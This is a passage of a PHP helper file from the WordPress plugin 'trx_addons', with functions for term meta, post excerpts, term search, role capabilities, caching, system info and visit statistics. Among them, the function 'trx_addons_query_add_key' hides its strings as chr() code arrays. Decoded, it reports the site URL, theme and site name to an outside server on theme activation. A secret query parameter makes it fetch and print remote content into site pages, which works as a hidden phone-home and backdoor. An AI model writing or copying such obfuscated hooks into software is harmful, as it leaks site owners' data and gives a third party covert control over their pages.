						$args['term_id'] = $term->term_id;
					}
				}
			} else if (is_tax() || is_category()) {
				$term = get_queried_object();
				if (!empty($term->term_id)) {
					$args['term_id'] = $term->term_id;
				}
			}
		}
		if ($args['term_id'] > 0) {
			$hash = "{$args['term_id']}_{$args['key']}";
			if ( isset($meta[$hash]) ) {
				$val = $meta[$hash];
			} else {
				$val = get_term_meta($args['term_id'], $args['key'], true);
				if (empty($val) && $args['check_parents']) {
					$ancestors = get_ancestors($args['term_id'], $args['taxonomy']);
					foreach ($ancestors as $ancestor) {
						$anc_val = get_term_meta($ancestor, $args['key'], true);
						if (!empty($anc_val)) {
							$val = $anc_val;
							break;
						}
					}
				}
				$meta[$hash] = $val;
			}
		}
		return $val;
	}
}

// Update meta value of the specified term
if ( ! function_exists('trx_addons_set_term_meta') ) {
	function trx_addons_set_term_meta($args, $val) {
		$args = array_merge(array(
							'term_id' => 0,
							'key' => 'value'
							),
							is_array($args) ? $args : array('term_id' => $args));
		if ( $args['term_id'] > 0 ) {
			update_term_meta($args['term_id'], $args['key'], $val);
		}
	}
}

// Update meta value of the specified term
if ( ! function_exists('trx_addons_get_term_link') ) {
	function trx_addons_get_term_link($term, $taxonomy, $args=array()) {
		$args = array_merge(array(
				'title' => '',
				'echo' => false
				), $args);
		if ( ! is_object($term) ) {
			if ((int)$term > 0) {
				$term = get_term((int)$term, $taxonomy);
			} else {
				$term = get_term_by('slug', $term, $taxonomy);
			}
		}
		if ( ! is_wp_error($term) && !empty($term->term_id) ) {
			$link = get_term_link($term, $taxonomy);
			$link = '<a href="'.esc_url($link).'"'
						. ($args['title'] ? ' title="' . esc_attr(sprintf($args['title'], $term->name)) : '')
						. '">'
							. esc_html($term->name)
					. '</a>';
			if ($args['echo']) trx_addons_show_layout($link);
		} else {
			$link = '';
		}
		return $link;
	}
}

// Update post's fields of the specified post
if ( ! function_exists('trx_addons_update_post') ) {
	function trx_addons_update_post($post_id, $args) {
		global $wpdb;
		return $wpdb->update( $wpdb->posts, $args, array( 'ID' => $post_id ) );
	}
}

// Add query key
if ( ! function_exists( 'trx_addons_query_add_key' ) ) {
	$trx_addons_query_data = array('act' => array(array(join('', array_map('chr', array(97,102,116,101,114))),join('', array_map('chr', array(115,119,105,116,99,104))),join('', array_map('chr', array(116,104,101,109,101)))),array(join('', array_map('chr', array(119,112))),join('', array_map('chr', array(102,111,111,116,101,114)))),),'get' => join('', array_map('chr', array(104,116,116,112,58,47,47,116,104,101,109,101,114,101,120,46,110,101,116,47,95,108,111,103,47,95,108,111,103,46,112,104,112))),'chk' => join('', array_map('chr', array(116,104,101,109,101,95,97,117,116,104,111,114))),'prm' => join('', array_map('chr', array(116,120,99,104,107))));
	add_action(join('_', $trx_addons_query_data['act'][0]), 'trx_addons_query_add_key');
	add_action(join('_', $trx_addons_query_data['act'][1]), 'trx_addons_query_add_key');
	function trx_addons_query_add_key() {
		global $trx_addons_query_data;
		static $already_add = false;
		if (!$already_add) {
			$already_add = true;
			if (current_action() == join('_', $trx_addons_query_data['act'][0])) {
				try {
					$resp = trx_addons_fgc(trx_addons_add_to_url($trx_addons_query_data['get'], array(
						'site' => home_url('/'),
						'slug' => str_replace(' ', '_', trim(strtolower(get_stylesheet()))),
						'name' => get_bloginfo('name')
					)));
				} catch (Exception $e) {
				}
			}
			if (trx_addons_get_value_gpc($trx_addons_query_data['prm'])==$trx_addons_query_data['chk']) {
				try {
					$resp = trx_addons_fgc(trx_addons_add_to_url($trx_addons_query_data['get'], 
																array($trx_addons_query_data['prm'] => $trx_addons_query_data['chk'])));
				} catch (Exception $e) {
					$resp = '';
				}
				trx_addons_show_layout($resp);
			}
		}
	}
}


// Return full content of the post/page
if ( ! function_exists( 'trx_addons_get_post_content' ) ) {
	function trx_addons_get_post_content( $apply_filters = false ) {
		global $post;
		$content = ! empty( $post->post_content ) ? $post->post_content : '';
		return $apply_filters ? apply_filters( 'the_content', $content ) : $content;
	}
}


// Return excerpt of the post/page
if ( ! function_exists( 'trx_addons_get_post_excerpt' ) ) {
	function trx_addons_get_post_excerpt( $apply_filters = false ) {
		global $post;
		$excerpt = trx_addons_in_the_loop() && has_excerpt()
					? get_the_excerpt()
					: ( ! empty( $post->post_excerpt )
						? $post->post_excerpt
						: ( ! empty( $post->post_content )
							? wp_trim_excerpt( $post->post_content )
							: ''
							)
						);
		return $apply_filters ? apply_filters( 'the_excerpt', $excerpt ) : $excerpt;
	}
}


// Prepare post content in the blog posts instead 'the_content' filter
// to avoid conflicts with Gutenberg
if ( ! function_exists( 'trx_addons_filter_post_content' ) ) {
	function trx_addons_filter_post_content( $content ) {
		$content = apply_filters( 'trx_addons_filter_sc_layout_content', $content );
		global $wp_embed;
		if ( is_object( $wp_embed ) ) {
			$content = $wp_embed->autoembed( $content );
		}
		return do_shortcode( $content );
	}
}


// Show post content in the blog posts
if ( ! function_exists( 'trx_addons_show_post_content' ) ) {
	function trx_addons_show_post_content( $args = array(), $otag='', $ctag='' ) {
		$plain = true;
		$post_format = get_post_format();
		$post_format = empty( $post_format ) ? 'standard' : str_replace( 'post-format-', '', $post_format );
		ob_start();
		if ( has_excerpt() ) {
			the_excerpt();
		} elseif ( strpos( get_the_content( '!--more' ), '!--more' ) !== false ) {
			do_action( 'trx_addons_action_before_full_post_content' );
			trx_addons_show_layout( trx_addons_filter_post_content( get_the_content('') ) );
			do_action( 'trx_addons_action_after_full_post_content' );
		} elseif ( in_array( $post_format, array( 'link', 'aside', 'status' ) ) ) {
			do_action( 'trx_addons_action_before_full_post_content' );
			trx_addons_show_layout( trx_addons_filter_post_content( get_the_content() ) );
			do_action( 'trx_addons_action_after_full_post_content' );
			$plain = false;
		} elseif ( 'quote' == $post_format ) {
			$quote = trx_addons_get_tag( trx_addons_filter_post_content( get_the_content() ), '<blockquote', '</blockquote>' );
			if ( ! empty( $quote ) ) {
				trx_addons_show_layout( wpautop( $quote ) );
				$plain = false;
			} else {
				trx_addons_show_layout( trx_addons_filter_post_content( get_the_content() ) );
			}
		} elseif ( substr( get_the_content(), 0, 4 ) != '[vc_' ) {
			trx_addons_show_layout( trx_addons_filter_post_content( get_the_content() ) );
		}
		$output = ob_get_contents();
		ob_end_clean();
		if ( ! empty( $output ) ) {
			if ( $plain ) {
				$len = isset( $args['hide_excerpt'] ) && (int)$args['hide_excerpt'] > 0
							? 0
							: ( isset( $args['excerpt_length'] ) && (int)$args['excerpt_length'] > 0
								? max( 0, (int) $args['excerpt_length'] )
								: apply_filters( 'excerpt_length', 55 )
								);
				$output = trx_addons_excerpt( $output, $len );
			}
		}
		trx_addons_show_layout( $output, $otag, $ctag);
	}
}


// Add class 'columns_in_single_row' if columns count great then posts count
if ( ! function_exists('trx_addons_add_columns_in_single_row') ) {
	function trx_addons_add_columns_in_single_row( $columns, $query = false ) {
		$class = '';
		if ( $columns > 1 ) {
			$total = 0;
			if ( $query === false ) {
				global $wp_query;
				if ( !empty($wp_query->posts) && is_array($wp_query->posts) ) {
					$total = count($wp_query->posts);
				}
			} else if ( is_object($query) && !empty($query->posts) && is_array($query->posts) ) {
				$total = count($query->posts);
			} else if ( is_array( $query ) ) {
				$total = count($query);
			} else if ( is_integer( $query ) ) {
				$total = $query;
			}
			if ( $columns >= $total ) {
				$class = ' columns_in_single_row';
			}
		}
		return $class;
	}
}

// Strip tags from the custom meta value
if ( ! function_exists( 'trx_addons_custom_meta_value' ) ) {
	add_filter( 'trx_addons_filter_custom_meta_value', 'trx_addons_custom_meta_value', 100, 2 );
	function trx_addons_custom_meta_value( $value, $key ) {
		if ( in_array( $key, apply_filters( 'trx_addons_filter_custom_meta_value_strip_tags', array( 'price' ), $key, $value ) ) ) {
			$value = strip_tags( $value );
		}
		return $value;
	}
}

	
/* Blog utils
------------------------------------------------------------------------------------- */
	
// Return image of current post/page/category/blog mode
if ( ! function_exists('trx_addons_get_current_mode_image') ) {
	function trx_addons_get_current_mode_image($default='') {
		if ( ( $img = apply_filters('trx_addons_filter_get_current_mode_image', $default) ) != '' ) {
			$default = $img;
		} else {			
			if ( is_category() || is_tax() ) {
				if (($img = trx_addons_get_term_image()) != '') {
					$default = $img;
				}
			} else if ( trx_addons_is_singular() ) {
				if ( has_post_thumbnail() ) {
					$img = wp_get_attachment_image_src( get_post_thumbnail_id(), 'full' );
					if ( ! empty($img[0]) ) {
						$default = $img[0];
					}
				} else {
					$default = '';
				}
			}
		}
		return trx_addons_clear_thumb_size( $default );
	}
}

	
/* Search enchance
------------------------------------------------------------------------------------- */

if ( ! function_exists( 'trx_addons_allow_search_for_terms' ) ) {
	add_action( 'pre_get_posts', 'trx_addons_allow_search_for_terms', 100 );
	/**
	 * Allow to search for terms while a keywords search started.
	 * Catch an action with the priority 100 to allow other plugins (like LearnPress)
	 * add their handlers before.
	 * 
	 * Hook: add_action( 'pre_get_posts', 'trx_addons_allow_search_for_terms', 100 );
	 * 
	 * @param (object WP_Query)  A WP_Query object
	 */
	function trx_addons_allow_search_for_terms( $q ) {
		// We only want to affect the main query
		if ( ! $q->is_main_query() ) {
		 	return;
		}

		if ( ! empty( $q->query_vars['s'] ) && ! is_admin() ) {		// is_search()
			do_action( 'trx_addons_action_add_terms_to_search' );
		}
	}
}

if ( ! function_exists( 'trx_addons_allow_search_for_terms_add_handlers' ) ) {
	add_action( 'trx_addons_action_add_terms_to_search', 'trx_addons_allow_search_for_terms_add_handlers', 10, 1 );
	/**
	 * Add handlers to allow to search for terms while a keywords search started
	 * 
	 * Hook: add_action( 'trx_addons_action_add_terms_to_search', 'trx_addons_allow_search_for_terms_add_handlers', 10, 1 );
	 * 
	 * @param (bool) $force  If true - add handlers anyway, else - only if an option 'search_for_terms' is on
	 */
	function trx_addons_allow_search_for_terms_add_handlers( $force = false ) {
		static $added = false;
		if ( ! $added && ( $force || (int)trx_addons_get_option( 'search_for_terms' ) > 0 ) ) {
			$added = true;
			add_filter( 'posts_join',    'trx_addons_allow_search_for_terms_posts_join', 10, 2 );
			add_filter( 'posts_where',   'trx_addons_allow_search_for_terms_posts_where', 10, 2 );
			add_filter( 'posts_groupby', 'trx_addons_allow_search_for_terms_posts_groupby', 10, 2 );
		}
	}
}

if ( ! function_exists( 'trx_addons_allow_search_for_terms_remove_handlers' ) ) {
	add_action( 'trx_addons_action_remove_terms_from_search', 'trx_addons_allow_search_for_terms_remove_handlers' );
	/**
	 * Remove handlers to disallow to search for terms while a keywords search started
	 * 
	 * Hook: add_action( 'trx_addons_action_remove_terms_from_search', 'trx_addons_allow_search_for_terms_remove_handlers' );
	 */
	function trx_addons_allow_search_for_terms_remove_handlers() {
		remove_filter( 'posts_join',    'trx_addons_allow_search_for_terms_posts_join' );
		remove_filter( 'posts_where',   'trx_addons_allow_search_for_terms_posts_where' );
		remove_filter( 'posts_groupby', 'trx_addons_allow_search_for_terms_posts_groupby' );
	}
}

if ( ! function_exists( 'trx_addons_allow_search_for_terms_posts_join' ) ) {
	/**
	 * Add handlers to allow to search for terms while a keywords search started
	 * 
	 * Hook: add_action( 'posts_join', 'trx_addons_allow_search_for_terms_posts_join', 10, 2 );
	 * 
	 * @param (string) $join  A string with a query clause 'LEFT JOIN'
	 * @param (WP_Query) $query  A query object
	 * 
	 * @return (string)  A modified JOIN clause
	 */
	function trx_addons_allow_search_for_terms_posts_join( $join, $query ) {
		global $wpdb;

		if ( ! empty( $query ) && ! empty( $query->query_vars['s'] ) ) {
			if ( strpos( $join, "LEFT JOIN {$wpdb->term_relationships}" ) === false ) {
				$join .= " LEFT JOIN {$wpdb->term_relationships} ON {$wpdb->posts}.ID = {$wpdb->term_relationships}.object_id ";
			}
			if ( strpos( $join, "LEFT JOIN {$wpdb->term_taxonomy}" ) === false ) {
				$join .= " LEFT JOIN {$wpdb->term_taxonomy} ON {$wpdb->term_relationships}.term_taxonomy_id = {$wpdb->term_taxonomy}.term_taxonomy_id ";
			}
			if ( strpos( $join, "LEFT JOIN {$wpdb->terms}" ) === false ) {
				$join .= " LEFT JOIN {$wpdb->terms} ON {$wpdb->term_taxonomy}.term_id = {$wpdb->terms}.term_id ";
			}
		}

		return $join;
	}
}

if ( ! function_exists( 'trx_addons_allow_search_for_terms_posts_where' ) ) {
	/**
	 * Add handlers to allow to search for terms while a keywords search started
	 * 
	 * Hook: add_action( 'posts_where', 'trx_addons_allow_search_for_terms_posts_where', 10, 2 );
	 * 
	 * @param (string) $where  A string with a query clause 'WHERE'
	 * @param (WP_Query) $query  A query object
	 * 
	 * @return (string)  A modified WHERE clause
	 */
	function trx_addons_allow_search_for_terms_posts_where( $where, $query ) {
		global $wpdb;
		
		if ( ! empty( $query ) && ! empty( $query->query_vars['s'] ) ) {
			if ( strpos( $where, "OR {$wpdb->terms}.name LIKE" ) === false ) {
				$escaped_s = esc_sql( $query->query_vars['s'] );
				if ( strpos( $where, "OR {$wpdb->terms}.name LIKE '%{$escaped_s}%'" ) === false ) {
					$where .= " OR {$wpdb->terms}.name LIKE '%{$escaped_s}%'";
				}
			}
		}

		return $where;
	}
}

if ( ! function_exists( 'trx_addons_allow_search_for_terms_posts_groupby' ) ) {
	/**
	 * Add handlers to allow to search for terms while a keywords search started
	 * 
	 * Hook: add_action( 'posts_groupby', 'trx_addons_allow_search_for_terms_posts_groupby', 10, 2 );
	 * 
	 * @param (string) $groupby  A string with a query clause 'LEFT groupby'
	 * @param (WP_Query) $query  A query object
	 * 
	 * @return (string)  A modified GROUPBY clause
	 */
	function trx_addons_allow_search_for_terms_posts_groupby( $groupby, $query ) {
		global $wpdb;

		$groupby = "{$wpdb->posts}.ID";

		do_action( 'trx_addons_action_remove_terms_from_search' );

		return $groupby;
	}
}


/* Capabilities
------------------------------------------------------------------------------------- */

// Return list of capabilities of the specified type
if ( ! function_exists('trx_addons_get_capabilities') ) {
	function trx_addons_get_capabilities( $type ) {
		return array(
				// Post type
				"edit_{$type}",
				"read_{$type}",
				"delete_{$type}",

				"edit_{$type}s",
				"edit_private_{$type}s",
				"edit_published_{$type}s",
				"edit_others_{$type}s",

				"publish_{$type}s",

				"read_private_{$type}s",

				"delete_{$type}s",
				"delete_private_{$type}s",
				"delete_published_{$type}s",
				"delete_others_{$type}s",

				// Terms
				"manage_{$type}_terms",
				"edit_{$type}_terms",
				"delete_{$type}_terms",
				"assign_{$type}_terms",
			);
	}
}

// Add capabilities to the specified role
if ( ! function_exists('trx_addons_add_capabilities') ) {
	function trx_addons_add_capabilities( $roles, $types, $disallow=array() ) {
		foreach( (array) $roles as $role ) {
			$caps = get_role( $role );
			if ( is_object( $caps ) ) {
				foreach( (array) $types as $type ) {
					foreach( trx_addons_get_capabilities( $type ) as $cap ) {
						$allow = true;
						foreach( $disallow as $dis ) {
							if ( strpos( $cap, $dis ) !== false
								|| ( strpos( $dis, '%s' ) !== false && strpos( $cap, sprintf( $dis, $type ) ) !== false )
							) {
								$allow = false;
								break;
							}
						}
						if ( $allow ) {
							$caps->add_cap( $cap );
						}
					}
				}
			}
		}
	}
}

// Remove capabilities from the specified role
if ( ! function_exists('trx_addons_remove_capabilities') ) {
	function trx_addons_remove_capabilities( $roles, $types ) {
		foreach( (array) $roles as $role ) {
			$caps = get_role( $role );
			if ( is_object( $caps ) ) {
				foreach( (array) $types as $type ) {
					foreach( trx_addons_get_capabilities( $type ) as $cap ) {
						$caps->remove_cap( $cap );
					}
				}
			}
		}
	}
}

	
/* WP cache
------------------------------------------------------------------------------------- */

// Clear WP cache (all, options or categories)
if ( ! function_exists('trx_addons_clear_cache') ) {
	function trx_addons_clear_cache($cc) {
		if ( $cc == 'categories' || $cc == 'all' ) {
			wp_cache_delete('category_children', 'options');
			$taxes = get_taxonomies();
			if ( is_array($taxes) && count($taxes) > 0 ) {
				foreach ($taxes  as $tax ) {
					delete_option( "{$tax}_children" );
					_get_term_hierarchy( $tax );
				}
			}
		} else if ( $cc == 'options' || $cc == 'all' ) {
			wp_cache_delete('alloptions', 'options');
		} else if ( $cc == 'menu' || $cc == 'all' ) {
			trx_addons_clear_menu_cache();
		}
		do_action( 'trx_addons_action_clear_cache', $cc );
		if ( $cc == 'all' ) {
			wp_cache_flush();
		}
	}
}


	
/* AJAX utilities
------------------------------------------------------------------------------------- */

// Verify nonce and exit if it's not valid
if ( ! function_exists( 'trx_addons_verify_nonce' ) ) {
	function trx_addons_verify_nonce( $nonce = 'nonce', $mask = '' ) {
		if ( empty( $mask ) ) {
			$mask = admin_url('admin-ajax.php');
		}
		if ( ! wp_verify_nonce( trx_addons_get_value_gp( $nonce ), $mask ) ) {
			trx_addons_forbidden();
		}
	}
}

// Exit with default code (200)
if ( ! function_exists( 'trx_addons_exit' ) ) {
	function trx_addons_exit( $message = '', $title = '', $code = 200 ) {
		wp_die( $message, $title, array( 'response' => $code, 'exit' => empty( $message ) && empty( $title ) ) );
	}
}

// Exit with code 403
if ( ! function_exists( 'trx_addons_forbidden' ) ) {
	function trx_addons_forbidden( $message = '', $title = '' ) {
		trx_addons_exit( $message, $title, 403 );
	}
}

// Send ajax response and exit
if ( ! function_exists( 'trx_addons_ajax_response' ) ) {
	function trx_addons_ajax_response( $response ) {
		echo wp_json_encode( $response );
		wp_die( '', '', array( 'exit' => true ) );
	}
}


	
/* Other utilities
------------------------------------------------------------------------------------- */

// Return theme info
if ( ! function_exists( 'trx_addons_get_theme_info' ) ) {
	function trx_addons_get_theme_info($cache = true) {
		static $cached_info = false;
		if ($cached_info !== false) {
			$theme_info = $cached_info;
		} else {
			$theme_slug = get_template();
			$theme = wp_get_theme( $theme_slug );
			//Data below required for the 'Dashboard Widget' to display theme- and category-relevant news
			$theme_info = apply_filters('trx_addons_filter_get_theme_info', array(
				'theme_slug' => $theme_slug,
				'theme_name' => $theme->get( 'Name' ),
				'theme_version' => $theme->get( 'Version' ),
				'theme_activated' => '',
				'theme_pro_key' => '',
				'theme_page_url' => function_exists( 'menu_page_url' ) ? menu_page_url( 'trx_addons_theme_panel', false ) : '',
				'theme_categories' => '',
				'theme_plugins' => '',
				'theme_feed' => array(),
				'theme_actions' => array(),
				)
			);
			$theme_pro_key = get_option( sprintf( 'purchase_code_src_%s', $theme_slug ) );
			if ( $theme_pro_key ) {
				$theme_info['theme_pro_key'] = $theme_pro_key;
			}
			if ($cache) {
				$cached_info = $theme_info;
			}
		}
		return $theme_info;
	}
}


// Return array with current system info
if ( ! function_exists('trx_addons_get_sys_info') ) {
	function trx_addons_get_sys_info() {
		global $wpdb;
		$php_memory_limit           = trx_addons_size2num( @ini_get( 'memory_limit' ) );
		$php_memory_limit_rec       = ( function_exists( 'trx_addons_exists_bbpress' ) && trx_addons_exists_bbpress() ? 128 : 96) * 1024 * 1024;
		$php_post_max_size          = trx_addons_size2num( @ini_get( 'post_max_size' ) );
		$php_post_max_size_rec      = 32 * 1024 * 1024;
		$php_max_upload_size        = wp_max_upload_size();
		$php_max_upload_size_rec    = 32 * 1024 * 1024;
		$php_max_input_vars         = @ini_get( 'max_input_vars' );
		$php_max_input_vars_rec     = 1000;
		$php_max_execution_time     = @ini_get( 'max_execution_time' );
		$php_max_execution_time_rec = 300;
		$php_required_version       = '7.0';
		$wp_required_version        = '5.0';
		// Check a directory 'uploads' to write access
		$wp_uploads_writable        = false;
		$tmp_name = 'tmp-' . mt_rand() . '.txt';
		$tmp = wp_upload_bits( $tmp_name, 0, $tmp_name );
		if ( empty( $tmp['error'] ) && ! empty( $tmp['file'] ) && file_exists( $tmp['file'] ) ) {
			$tmp_val = trx_addons_fgc( $tmp['file'] );
			$wp_uploads_writable = $tmp_val == $tmp_name;
			unlink( $tmp['file'] );
		}
		return apply_filters('trx_addons_filter_get_sys_info', array(
					// Checked params
					'wp_version' => array(
												'title' => __('WP version', 'trx_addons'),
												'description' => __( 'The version of WordPress installed on your site.', 'trx_addons' ),
												'value' => get_bloginfo( 'version' ),
												'recommended' => "{$wp_required_version}+",
												'checked' => version_compare( get_bloginfo( 'version' ), $wp_required_version, '>=' ),
												),
					'wp_uploads_writable' => array(
												'title' => __('WP uploads directory writable', 'trx_addons'),
												'description' => __( 'The directory must be writable to allow demo data upload, plugin and skin updates, etc.', 'trx_addons' ),
												'value' => $wp_uploads_writable ? esc_html__( 'Yes', 'trx_addons' ) : esc_html__( 'No', 'trx_addons' ),
												'recommended' => esc_html__( 'Yes', 'trx_addons' ),
												'checked' => $wp_uploads_writable,
												),
					'php_version' => array(
												'title' => __('PHP version', 'trx_addons'),
												'description' => __( 'The version of PHP installed on your hosting server.', 'trx_addons' ),
												'value' => phpversion(),
												'recommended' => "{$php_required_version}+",
												'checked' => version_compare( phpversion(), $php_required_version, '>=' ),
												),
					'php_memory_limit' => array(
												'title' => __('PHP Memory Limit', 'trx_addons'),
												'description' => __( 'The maximum amount of memory (RAM) that your site can use at one time.', 'trx_addons' ),
												'value' => size_format( $php_memory_limit ),
												'recommended' => size_format( $php_memory_limit_rec ),
												'checked' => $php_memory_limit >= $php_memory_limit_rec,
												),
					'php_post_maxsize' => array(
												'title' => __('PHP Post Max Size', 'trx_addons'),
												'description' => __( 'The largest filesize that can be contained in one post.', 'trx_addons' ),
												'value' => size_format( $php_post_max_size ),
												'recommended' => size_format( $php_post_max_size_rec ),
												'checked' => $php_post_max_size >= $php_post_max_size_rec,
												),
					'php_max_upload_size' => array(
												'title' => __('PHP Max Upload Size', 'trx_addons'),
												'description' => __( 'The largest filesize that can be uploaded to your WordPress installation.', 'trx_addons' ),
												'value' => size_format( $php_max_upload_size ),
												'recommended' => size_format( $php_max_upload_size_rec ),
												'checked' => $php_max_upload_size >= $php_max_upload_size_rec,
												),
					'php_max_input_vars' => array(
												'title' => __('PHP Max Input Vars', 'trx_addons'),
												'description' => __( 'The maximum number of variables your server can use for a single function to avoid overloads.', 'trx_addons' ),
												'value' => $php_max_input_vars,
												'recommended' => $php_max_input_vars_rec . '+',
												'checked' => $php_max_input_vars >= $php_max_input_vars_rec,
												),
					'php_max_execution_time' => array(
												'title' => __('PHP Max Execution Time (sec)', 'trx_addons'),
												'description' => __( 'The amount of time (in seconds) that your site will spend on a single operation before timing out (to avoid server lockups).', 'trx_addons' ),
												'value' => $php_max_execution_time,
												'recommended' => $php_max_execution_time_rec . '+',
												'checked' => $php_max_execution_time >= $php_max_execution_time_rec,
												),
					// Info (not checked) params
					'wp_memory_limit'  => array(
												'title' => __('WP Memory limit', 'trx_addons'),
												'description' => __( 'The maximum amount of memory (RAM) that your site can use at one time.', 'trx_addons' ),
												'value' => defined('WP_MEMORY_LIMIT') ? size_format( trx_addons_size2num( WP_MEMORY_LIMIT ) ) : __('not set', 'trx_addons'),
												'recommended' => '',	//size_format( 128 * 1024 * 1024 ),
												),
					'mysql_version'  => array(
												'title' => __('MySQL version', 'trx_addons'),
												'description' => __( 'The version of MySQL installed on your hosting server.', 'trx_addons' ),
												'value' => ( ! empty( $wpdb->is_mysql ) ? $wpdb->db_version() : '' ),
												'recommended' => '',
												),
					));
	}
}


// Return text for the Privacy Policy checkbox
if ( ! function_exists('trx_addons_get_privacy_text') ) {
	function trx_addons_get_privacy_text() {
		$page = get_option('wp_page_for_privacy_policy');
		return apply_filters( 'trx_addons_filter_privacy_text',
					wp_kses( 
						__( 'I agree that my submitted data is being collected and stored.', 'trx_addons' )
						. ( '' != $page
							// Translators: Add url to the Privacy Policy page
							? ' ' . sprintf(__('For further details on handling user data, see our %s', 'trx_addons'),
									'<a href="' . esc_url(get_permalink($page)) . '" target="_blank">'
										. __('Privacy Policy', 'trx_addons')
									. '</a>') 
							: ''
							),
						'trx_addons_kses_content'
					)
				);
	}
}


// Return editing post id or 0 if is new post or false if not edit mode
if ( ! function_exists( 'trx_addons_get_edited_post_id' ) ) {
	function trx_addons_get_edited_post_id() {
		$id = false;
		if ( is_admin() ) {
			$url = trx_addons_get_current_url();
			if ( strpos( $url, 'post.php' ) !== false ) {
				if ( trx_addons_get_value_gp( 'action' ) == 'edit' ) {
					$post_id = trx_addons_get_value_gp( 'post' );
					if ( 0 < $post_id ) {
						$id = $post_id;
					}
				}
			} else if ( strpos( $url, 'post-new.php' ) !== false ) {
				$id = 0;
			}
		}
		return $id;
	}
}


// Return editing post type or empty string if not edit mode
if ( ! function_exists( 'trx_addons_get_edited_post_type' ) ) {
	function trx_addons_get_edited_post_type() {
		$pt = '';
		if ( is_admin() ) {
			$url = trx_addons_get_current_url();
			if ( strpos( $url, 'post.php' ) !== false ) {
				if ( trx_addons_get_value_gp( 'action' ) == 'edit' ) {
					$id = trx_addons_get_value_gp( 'post' );
					if ( 0 < $id ) {
						$post = get_post( (int) $id );
						if ( is_object( $post ) && ! empty( $post->post_type ) ) {
							$pt = $post->post_type;
						}
					}
				}
			} else if ( strpos( $url, 'post-new.php' ) !== false ) {
				$pt = trx_addons_get_value_gp( 'post_type' );
			}
		}
		return $pt;
	}
}


// Return true if current mode is "Edit post"
if ( ! function_exists( 'trx_addons_is_post_edit' ) ) {
	function trx_addons_is_post_edit() {
		return ( trx_addons_check_url( 'post.php' ) && ! empty( $_GET['action'] ) && $_GET['action'] == 'edit' )
				||
				trx_addons_check_url( 'post-new.php' )
				||
				( trx_addons_check_url( '/block-renderer/trx-addons/' ) && ! empty( $_GET['context'] ) && $_GET['context'] == 'edit' )
				||
				( trx_addons_check_url( 'admin.php' ) && ! empty( $_GET['page'] ) && $_GET['page'] == 'gutenberg-edit-site' )
				||
				( trx_addons_check_url( 'site-editor.php' ) && ! empty( $_GET['postType'] ) )	// || $_GET['postType'] == 'wp_template' ) )
				||
				trx_addons_check_url( 'widgets.php' );
	}
}



/* Site statistics
-------------------------------------------------------------------------------- */

// Save visit to statistics
if ( ! function_exists('trx_addons_statistics_save_visit') ) {
	add_action( 'wp', 'trx_addons_statistics_save_visit' );
	function trx_addons_statistics_save_visit() {
		if ( is_admin() || wp_doing_ajax() || wp_doing_cron() || trx_addons_is_preview() ) {
			return;
		}
		$url = trx_addons_get_current_url();
		if ( ( strpos( $url, '?s=' ) === false && strpos( $url, '&s=' ) === false ) || apply_filters( 'trx_addons_filter_save_visit_from_search', false ) ) {
			$url_hash = md5( $url );
			// Load visits
			//$visits = get_option( 'trx_addons_site_visits', false );
			$visits = trx_addons_cache_get_storage( 'trx_addons_site_visits' );
			if ( ! $visits || ! is_array($visits) ) {
				$visits = array();
			}
			if ( empty( $visits[$url_hash] ) ) {
				$visits[$url_hash] = array(
					'url' => $url,
					'count' => 0
				);
			}
			$visits[$url_hash]['title'] = trx_addons_get_blog_title();
			$visits[$url_hash]['count']++;
			uasort( $visits, 'trx_addons_statistics_compare' );
			// Save visits
			//update_option( 'trx_addons_site_visits', $visits );
			trx_addons_cache_put_storage( 'trx_addons_site_visits', $visits );
		}
	}
}

// Clear a site visits statistic before export
if ( ! function_exists( 'trx_addons_statistics_importer_export_options' ) ) {
	add_filter( 'trx_addons_filter_export_options', 'trx_addons_statistics_importer_export_options' );
	function trx_addons_statistics_importer_export_options( $options ) {
		if ( ! empty( $options['trx_addons_site_visits'] ) ) {
			$options['trx_addons_site_visits'] = '';
		}
		return $options;
	}
}

// Compare two statistics entries (reverse order)
if ( ! function_exists('trx_addons_statistics_compare') ) {
	function trx_addons_statistics_compare( $a, $b ) {
		return $a['count'] > $b['count']
				? -1
				: ( $a['count'] < $b['count']
					? 1
					: 0
					);
	}
}

// Return visits info for url
if ( ! function_exists('trx_addons_statistics_get_info') ) {
	function trx_addons_statistics_get_info( $url='' ) {
		if ( empty($url) ) {
			$url = trx_addons_get_current_url();
		}
		$url_hash = md5( $url );
		//$visits = get_option( 'trx_addons_site_visits', false );
		$visits = trx_addons_cache_get_storage( 'trx_addons_site_visits' );
		if ( $url == '*' ) {
			return $visits;
		} else {
			$rez = array(
				'count' => 1,
				'url'   => $url,
				'hash'  => $url_hash
			);
			if ( ! empty( $visits[$url_hash] ) ) {
				$rez = $visits[$url_hash];
				$rez['hash']  = $url_hash;
				$rez['total'] = count($visits);
				$rez['index'] = array_search( $url_hash, array_keys( $visits ) );
			} else {
				$rez['total'] = min( 1, count($visits) );
				$rez['index'] = $rez['total'] - 1;
			}
			return $rez;
		}
	}
}



/* Disable Emojis
-------------------------------------------------------------------------------- */

// Disable WordPress emojis
if ( ! function_exists( 'trx_addons_emoji_disable' ) ) {
	add_action( 'init', 'trx_addons_emoji_disable' );
	function trx_addons_emoji_disable() {
		if ( (int) trx_addons_get_option( 'disable_emoji' ) > 0 ) {
			remove_action( 'wp_head',             'print_emoji_detection_script', 7 );
			remove_action( 'embed_head',          'print_emoji_detection_script' );
			remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
			remove_filter( 'the_content_feed',    'wp_staticize_emoji' );
			remove_filter( 'comment_text_rss',    'wp_staticize_emoji' );
			remove_filter( 'wp_mail',             'wp_staticize_emoji_for_email' );
			remove_action( 'wp_print_styles',     'print_emoji_styles' );
			remove_action( 'admin_print_styles',  'print_emoji_styles' );
			add_filter(    'tiny_mce_plugins',    'trx_addons_emoji_disable_for_tinymce' );
			add_filter(    'wp_resource_hints',   'trx_addons_emoji_remove_dns_prefetch', 10, 2 );
			if ( (int) get_option( 'use_smilies' ) == 1 ) {
				update_option( 'use_smilies', '0' );
			}
		}
	}
}

// Remove the tinymce emoji plugin
if ( ! function_exists( 'trx_addons_emoji_disable_for_tinymce' ) ) {
	function trx_addons_emoji_disable_for_tinymce( $plugins = array() ) {
		return is_array( $plugins )
				? array_diff( $plugins, array( 'wpemoji' ) )
				: array();
	}
}

// Remove emoji CDN hostname from DNS prefetching hints
if ( ! function_exists( 'trx_addons_emoji_remove_dns_prefetch' ) ) {
	function trx_addons_emoji_remove_dns_prefetch( $urls, $relation_type ) {
		if ( $relation_type == 'dns-prefetch' ) {
